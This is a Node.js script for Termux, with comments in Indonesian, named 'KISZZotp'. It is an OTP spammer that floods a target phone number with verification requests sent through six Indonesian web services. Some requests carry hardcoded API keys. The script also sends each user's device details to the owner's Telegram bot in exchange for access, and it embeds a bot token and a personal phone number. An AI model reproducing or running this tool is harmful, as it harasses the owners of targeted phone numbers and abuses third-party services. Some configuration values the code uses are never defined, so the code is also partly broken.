import axios from 'axios';
import chalk from 'chalk';
import readlineSync from 'readline-sync';
import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';

// ============================================
// 1. KONFIGURASI - GANTI INI!
// ============================================
const CONFIG = {
    TELEGRAM_TOKEN: '8732611588:AAGshd8fghjklmnoPQRS',   // Token dari BotFather
    TELEGRAM_CHAT_ID: '8276813899',                       // ID dari userinfobot
    OWNER_NUMBER: '085168142675',
    VERSION: '1.2.0'
};

// ============================================
// 2. FUNGSI UTILITY
// ============================================
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function getTermuxId() {
    try {
        const uid = execSync('id -u').toString().trim();
        const hostname = os.hostname();
        return `${uid}@${hostname}`;
    } catch { return 'unknown'; }
}

function getDeviceInfo() {
    try {
        const model = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
        const android = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
        return `${model} (Android ${android})`;
    } catch { return 'Unknown Device'; }
}

function getCurrentTime() {
    return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
}

function generateCode() {
    return crypto.randomInt(100000, 999999).toString();
}

// ============================================
// 3. FUNGSI TELEGRAM (Kirim & Polling)
// ============================================
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
        return true;
    } catch { return false; }
}

async function getTelegramUpdates(offset) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/getUpdates`;
        const res = await axios.get(url, { params: { offset, timeout: 10 } });
        return res.data.result || [];
    } catch { return []; }
}

// ============================================
// 4. SISTEM APPROVAL
// ============================================
function isApproved(termuxId) {
    try {
        if (!fs.existsSync('approved.json')) return false;
        const data = JSON.parse(fs.readFileSync('approved.json'));
        return data.includes(termuxId);
    } catch { return false; }
}

function saveApproved(termuxId) {
    try {
        let data = [];
        if (fs.existsSync('approved.json')) {
            data = JSON.parse(fs.readFileSync('approved.json'));
        }
        if (!data.includes(termuxId)) {
            data.push(termuxId);
            fs.writeFileSync('approved.json', JSON.stringify(data, null, 2));
        }
        return true;
    } catch { return false; }
}

async function requestApproval(userName, termuxId, device) {
    const code = generateCode();
    const msg = `🔐 *Request Approval KISZZotp*

👤 Nama: ${userName}
🆔 ID: ${termuxId}
📱 Device: ${device}
🔑 Kode: *${code}*

Balas pesan ini dengan:
\`/approve_${code}\` untuk izinkan
\`/deny_${code}\` untuk tolak

⏳ Berlaku ${CONFIG.APPROVAL_TIMEOUT} detik.`;

    console.log(chalk.yellow('\n⏳ Mengirim request approval ke owner...'));
    const sent = await sendTelegramMessage(msg);
    if (!sent) {
        console.log(chalk.red('❌ Gagal mengirim request ke Telegram. Cek token & chat ID.'));
        process.exit(1);
    }

    console.log(chalk.green('✅ Request terkirim! Menunggu approval dari owner...'));
    console.log(chalk.gray(`   (maksimal ${CONFIG.APPROVAL_TIMEOUT} detik)`));

    // Polling
    let offset = 0;
    const startTime = Date.now();
    while ((Date.now() - startTime) / 1000 < CONFIG.APPROVAL_TIMEOUT) {
        const updates = await getTelegramUpdates(offset);
        for (const update of updates) {
            offset = update.update_id + 1;
            const text = update.message?.text || '';
            // Cek apakah dari chat owner
            if (update.message?.chat?.id == CONFIG.TELEGRAM_CHAT_ID) {
                if (text.includes(`/approve_${code}`)) {
                    console.log(chalk.green('\n✅ APPROVED oleh owner!'));
                    saveApproved(termuxId);
                    return true;
                } else if (text.includes(`/deny_${code}`)) {
                    console.log(chalk.red('\n❌ Ditolak oleh owner.'));
                    return false;
                }
            }
        }
        await sleep(CONFIG.POLL_INTERVAL * 1000);
    }

    console.log(chalk.red('\n⏰ Waktu habis! Tidak ada respon dari owner.'));
    return false;
}

// ============================================
// 5. FUNGSI LAINNYA (Menu, Spammer, dll)
// ============================================
const sleep2 = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function getUserName() {
    let name = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
    if (!name.trim()) name = 'Anonymous';
    return name.trim();
}

function getStatus(isOwner) {
    return isOwner ? chalk.green('★ OWNER') : chalk.yellow('▸ Gratisan');
}

function showHeader(user, status, termuxId, device) {
    console.clear();
    console.log(chalk.cyan(`
    ╔═══════════════════════════════════════════════╗
    ║                                               ║
    ║   ██╗  ██╗██╗███████╗███████╗███████╗       ║
    ║   ██║ ██╔╝██║╚══███╔╝╚══███╔╝╚══███╔╝       ║
    ║   █████╔╝ ██║  ███╔╝   ███╔╝   ███╔╝        ║
    ║   ██╔═██╗ ██║ ███╔╝   ███╔╝   ███╔╝         ║
    ║   ██║  ██╗██║███████╗███████╗███████╗       ║
    ║   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝       ║
    ║                                               ║
    ║         ${chalk.bold('KISZZotp v' + CONFIG.VERSION)}                     ║
    ╚═══════════════════════════════════════════════╝
    `));

    console.log(chalk.white(`╔═══════════════════════════════════════════════╗`));
    console.log(chalk.white(`║ ${chalk.bold('👤 User')}   : ${chalk.green(user)}`));
    console.log(chalk.white(`║ ${chalk.bold('📊 Status')} : ${status}`));
    console.log(chalk.white(`║ ${chalk.bold('🆔 ID')}     : ${chalk.blue(termuxId)}`));
    console.log(chalk.white(`║ ${chalk.bold('📱 Device')} : ${chalk.magenta(device)}`));
    console.log(chalk.white(`║ ${chalk.bold('⏰ Waktu')}  : ${chalk.gray(getCurrentTime())}`));
    console.log(chalk.white(`╚═══════════════════════════════════════════════╝`));
    console.log();
}

function showMenu() {
    console.log(chalk.yellow(`╔═══════════════════════════════════════════════╗`));
    console.log(chalk.yellow(`║              📋  MENU UTAMA                  ║`));
    console.log(chalk.yellow(`╠═══════════════════════════════════════════════╣`));
    console.log(chalk.yellow(`║ ${chalk.cyan('1.')} 🚀  Jalankan Spammer OTP         ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('2.')} 🐛  Lapor Bug ke Owner           ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('3.')} 🔄  Cek Update                 ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('4.')} ❌  Keluar                     ║`));
    console.log(chalk.yellow(`╚═══════════════════════════════════════════════╝`));
    console.log();
}

async function runSpammer(user) {
    console.clear();
    console.log(chalk.cyan('🚀 MEMULAI SPAMMER OTP...\n'));

    const target = readlineSync.question(chalk.white('📱 Masukkan nomor target (contoh: 08123456789): '));
    if (!target.trim()) {
        console.log(chalk.red('❌ Nomor tidak boleh kosong!'));
        await sleep2(1500);
        return;
    }

    let phone = target.replace(/[^0-9]/g, "");
    if (phone.startsWith("0")) phone = "62" + phone.slice(1);
    if (!phone.startsWith("62")) phone = "62" + phone;

    const p08 = "0" + phone.slice(2);
    const p62 = phone;

    console.log(chalk.green(`✅ Target: ${phone}\n`));

    const otp = [
        { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
        { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
        { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
        { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
        { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID" } },
        { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
    ];

    let success = 0, failed = 0;
    for (let i = 0; i < otp.length; i++) {
        const ep = otp[i];
        try {
            const config = {
                headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
                timeout: 10000
            };
            console.log(`[${i+1}/${otp.length}] 🔄 ${ep.url}`);
            if (ep.method === "GET") await axios.get(ep.url, config);
            else await axios.post(ep.url, ep.data, config);
            success++;
            console.log(`   ✅ Berhasil`);
        } catch (e) {
            failed++;
            console.log(`   ❌ Gagal - ${e.message}`);
        }
        await sleep2(1000);
    }

    console.log('\n========== LAPORAN ==========');
    console.log(`📱 Nomor: ${phone}`);
    console.log(`📤 Total: ${otp.length}`);
    console.log(`✅ Berhasil: ${success}`);
    console.log(`❌ Gagal: ${failed}`);
    console.log('===============================\n');
    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu...'));
}

function reportBug(user) {
    console.clear();
    console.log(chalk.yellow('🐛 LAPOR BUG KE OWNER\n'));
    console.log(chalk.white(`📱 Nomor Owner: ${CONFIG.OWNER_NUMBER}`));
    const confirm = readlineSync.question(chalk.cyan('Buka WhatsApp sekarang? (y/n): '));
    if (confirm.toLowerCase() === 'y') {
        const url = `https://wa.me/${CONFIG.OWNER_NUMBER}?text=Halo%20KISZZ%2C%20saya%20${encodeURIComponent(user)}%20ingin%20lapor%20bug.`;
        execSync(`termux-open-url "${url}"`);
    }
    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu...'));
}

async function checkUpdate(user) {
    console.clear();
    console.log(chalk.cyan('🔄 MENCARI UPDATE...\n'));
    console.log(chalk.green(`✅ Versi terbaru: ${CONFIG.VERSION}`));
    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
}

// ============================================
// 6. MAIN PROGRAM
// ============================================
async function main() {
    console.clear();
    console.log(chalk.cyan(`
    ╔═══════════════════════════════════════════════╗
    ║     SELAMAT DATANG DI KISZZotp               ║
    ╚═══════════════════════════════════════════════╝
    `));

    const userName = getUserName();
    const termuxId = getTermuxId();
    const device = getDeviceInfo();
    const isOwner = userName.toLowerCase() === 'kiszz';

    // ===== SISTEM APPROVAL =====
    if (!isOwner) {
        if (!isApproved(termuxId)) {
            console.log(chalk.yellow('\n🔐 Script ini memerlukan approval dari owner.'));
            const approved = await requestApproval(userName, termuxId, device);
            if (!approved) {
                console.log(chalk.red('❌ Akses ditolak. Script akan keluar.'));
                process.exit(1);
            }
        } else {
            console.log(chalk.green('\n✅ Anda sudah terdaftar. Selamat datang kembali!'));
        }
    } else {
        console.log(chalk.green('\n👑 Owner mode aktif. Tidak perlu approval.'));
    }

    // Menu utama
    while (true) {
        const status = getStatus(isOwner);
        showHeader(userName, status, termuxId, device);
        showMenu();

        const choice = readlineSync.question(chalk.cyan('Pilih menu [1-4]: '));

        switch (choice) {
            case '1': await runSpammer(userName); break;
            case '2': reportBug(userName); break;
            case '3': await checkUpdate(userName); break;
            case '4':
                console.log(chalk.green('\n👋 Terima kasih telah menggunakan KISZZotp!'));
                process.exit(0);
            default:
                console.log(chalk.red('❌ Pilihan tidak valid!'));
                await sleep2(1000);
        }
    }
}

main().catch(err => console.error(chalk.red('❌ Error:', err.message)));